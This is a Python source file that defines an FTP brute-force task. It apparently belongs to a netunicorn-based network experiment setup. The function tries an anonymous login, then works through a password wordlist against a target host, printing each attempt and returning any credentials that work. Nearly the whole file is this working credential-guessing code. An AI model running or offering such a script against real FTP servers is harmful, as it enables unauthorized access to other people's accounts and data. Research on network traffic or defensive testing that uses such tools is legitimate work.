#!/usr/bin/env python
# -*- coding:utf-8 -*-

import argparse
import sys
from ftplib import FTP
from netunicorn.base import Failure, Result, Success
from netunicorn.base.task import Task

def brute_force(target, username, wordlist):
    try:
        ftp = FTP(target)
        ftp.login()
        ftp.quit()
        return Success('No credentials required for anonymous login')
    except:
        pass

    try:
        for password in wordlist:
            try:
                # print(f'trying {password}')
                ftp = FTP(target)
                ftp.login(username, password)
                ftp.quit()
                
                return Success(f'Login successful: User - {username}, Password - {password}')
            except:
                print(f"[Attempt] target:- {target} - login:{username} - password:{password}")
        return Failure('No valid credentials found in wordlist')
    except:
        print('\nError with wordlist list')
        return Failure('Error with wordlist list')
